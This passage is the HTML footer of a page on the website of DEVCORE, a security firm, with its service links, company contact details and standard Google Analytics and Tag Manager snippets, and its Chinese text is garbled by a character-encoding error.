            æˆ´å¤«å¯‡çˆ¾æä¾›<br class="mobile-only" /><a href="/services/penetration-test" class="link">æ»²é€æ¸¬è©¦</a>ã€<a href="/services/red-team" class="link">ç´…éšŠæ¼”ç·´</a>ã€<a href="/services/security-consulting" class="link">è³‡å®‰é¡§å•</a>èˆ‡<a href="/services/security-training" class="link">æ•™è‚²è¨“ç·´</a>æœå‹™<br />åœ¨<a href="https://www.facebook.com/D3VC0RE" class="link" target="_blank">Facebook</a>æˆ–<a href="https://twitter.com/d3vc0r3" class="link" target="_blank">Twitter</a>ä¸Šè¿½è¹¤æˆ‘å€‘çš„<a href="/blog/" class="link">æœ€æ–°è¨Šæ¯</a><br />ç­è§£æ›´å¤šæˆ´å¤«å¯‡çˆ¾çš„<a href="/about/" class="link">é§­å®¢æ€ç¶­</a>
          </div>
          <div class="main-footer__snses"><a href="https://www.facebook.com/D3VC0RE" class="main-footer__sns" target="_blank">
                <svg class="icon-fb icon"><use xlink:href="#icon-fb" /></svg></a><a href="https://twitter.com/d3vc0r3" class="main-footer__sns" target="_blank">
                <svg class="icon-twitter icon"><use xlink:href="#icon-twitter" /></svg></a>
          </div>
          <address class="main-footer__address">
            <ul class="list--unstyled">
              <li>
                åœ°å€ 105608 å°åŒ—å¸‚æ¾å±±å€å…«å¾·è·¯ä¸‰æ®µ 32 è™Ÿ 13 æ¨“
              </li>
              <li>
                Email contact@devco.re
              </li>
              <li>
                é›»è©± 02-2577-0925
              </li>
              <li>
                å‚³çœŸ 02-2577-0928
              </li>
              <li>
                çµ±ç·¨ 53955237
              </li>
            </ul>
          </address><small class="main-footer__copyright"><a href="/" class="logo">DEVCORE</a>Â©2021 DEVCORE æˆ´å¤«å¯‡çˆ¾</small>
        </footer>
      </div>
    </div>
    <script src="/assets/themes/devcore-v2/javascripts/webpack_bundle.js"></script>



  <script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-30830800-1']);
  _gaq.push(['_trackPageview', location.pathname + location.search + location.hash]);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script>




    <!-- Google Tag Manager (noscript) -->
    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-K5B8NW"
    height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
    <!-- End Google Tag Manager (noscript) -->

  </body>
</html>




